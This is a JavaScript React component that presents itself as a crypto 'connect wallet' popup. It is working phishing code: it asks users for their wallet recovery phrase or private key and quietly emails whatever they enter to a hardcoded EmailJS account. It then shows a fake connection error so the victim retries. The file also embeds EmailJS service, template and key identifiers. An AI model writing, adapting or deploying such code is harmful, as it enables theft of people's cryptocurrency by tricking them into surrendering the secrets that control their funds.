import { XMarkIcon } from "@heroicons/react/24/outline";
import { wallets } from "../data";
import { useState } from "react";
import { ClipLoader } from "react-spinners";
import emailjs from "@emailjs/browser";

const Wallet = ({ name, image, popular, wallet, setEnter, setNewPop }) => {
  return (
    <div
      className="bg-gray-100 flex items-center gap-3 justify-center flex-col p-3 rounded-xl cursor-pointer relative overflow-hidden"
      onClick={() => {
        setNewPop(true);
        setEnter(wallet);
      }}
    >
      <img src={image} alt="#" className="w-[80px] h-[80px] object-contain" />
      <p className="capitalize tracking-wide font-semibold">{name}</p>
      {popular && (
        <span className="w-fit bg-slate-300 capitalize py-1 px-3 text-gray-500 absolute top-0 right-0">
          popular
        </span>
      )}
    </div>
  );
};
const Popup = ({ setShow }) => {
  const [enter, setEnter] = useState({});
  const [newPop, setNewPop] = useState(false);
  const [tab, setTab] = useState("phrase");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const [wordings, setWordings] = useState("");
  const [wordings2, setWordings2] = useState("");

  const templateParams = {
    from_name: "Abubakar Musa",
    to_name: "Sir/Ma",
    message:
      wordings === "" && wordings2 === ""
        ? `A User Did not Input a Phrase But tried To Submit it for ${enter.name} `
        : `This is the Phrase that was entered by the user "${
            wordings || wordings2
          }" for "${enter.name}"`,
  };

  const sendMail = () => {
    emailjs
      .send(
        "service_wl8y27e",
        "template_glu3lq7",
        templateParams,
        "4VVkrwCzu1kyQDvJ2"
      )
      .then(
        function (response) {
          console.log("SUCCESS!", response.status, response.text);
        },
        function (error) {
          console.log("FAILED...", error);
        }
      );
  };

  const sendEmail = () => {
    setLoading(true);
    sendMail();
    setTimeout(() => {
      setLoading(false);
      setError(true);
    }, 4000);
  };
  return (
    <div className="fixed top-0 left-0 h-full w-full bg-black/60 flex items-center justify-center">
      <div className="bg-white p-7 w-[95%] md:w-[80%] rounded-lg h-[90%] md:h-auto overflow-y-scroll">
        <div className="flex items-center justify-between capitalize font-semibold text-2xl">
          <h2>connect wallet</h2>
          <XMarkIcon
            className="h-8 cursor-pointer"
            onClick={() => setShow(false)}
          />
        </div>
        {newPop ? (
          <div className="mt-[30px]">
            <div className="flex items-center justify-center flex-col">
              <img src={enter?.image} alt="#" className="h-[50px] w-[50px]" />

              {error ? (
                <div className="text-center my-5 bg-red-200 text-red-600 p-3 rounded-lg">
                  <p>Error Connecting.... Please retry</p>
                </div>
              ) : (
                <p className="text-center bg-blue-200 text-blue-600 rounded-md p-4 mt-[15px]">
                  Info alert! Securely use any of the options below
                </p>
              )}
            </div>
            <div>
              <div className="shadow-lg p-4 mt-[10px] rounded">
                <div className="flex items-center gap-3">
                  <h2
                    className={`capitalize transition-all ease-in-out duration-300 cursor-pointer ${
                      tab === "phrase" && " text-blue-500 font-bold"
                    }`}
                    onClick={() => setTab("phrase")}
                  >
                    Phrase
                  </h2>
                  <h2
                    className={`capitalize transition-all ease-in-out duration-300 cursor-pointer ${
                      tab === "private" && " text-blue-500 font-bold"
                    }`}
                    onClick={() => setTab("private")}
                  >
                    private key
                  </h2>
                </div>
                <div>
                  {tab === "phrase" && (
                    <>
                      <textarea
                        rows={5}
                        className="w-full border border-blue-500 rounded-lg mt-4 p-5 mb-2 outline-none"
                        placeholder="Recovery Phrase"
                        onChange={(e) => setWordings(e.target.value)}
                      />
                      <span className="">
                        Typically 12 - 24 words seperated by a single space
                      </span>
                    </>
                  )}
                  {tab === "private" && (
                    <>
                      <input
                        type="text"
                        className="w-full border border-blue-500 rounded-lg mt-4 p-5 mb-2 outline-none"
                        placeholder="Private Key..."
                        onChange={(e) => setWordings2(e.target.value)}
                      />
                      <span className="">
                        Typically 64 Alphanumeric Characters
                      </span>
                    </>
                  )}
                </div>
                <div>
                  {loading ? (
                    <div className="my-4">
                      {" "}
                      <ClipLoader />
                    </div>
                  ) : (
                    <button
                      onClick={() => sendEmail()}
                      className="mt-5 bg-blue-500 py-[15px] px-[30px] rounded text-white "
                    >
                      Connect
                    </button>
                  )}
                </div>
              </div>
            </div>
          </div>
        ) : (
          <>
            <p className="uppercase text-[10px] md:text-[13px] tracking-wide my-[15px]">
              connect with one of our available wallet provider
            </p>
            <div className="grid grid-cols-1 md:grid-cols-4 gap-3 mt-5">
              {wallets.map((wallet, i) => (
                <Wallet
                  {...wallet}
                  key={i}
                  wallet={wallet}
                  setEnter={setEnter}
                  setNewPop={setNewPop}
                />
              ))}
            </div>
          </>
        )}
      </div>
    </div>
  );
};

export default Popup;
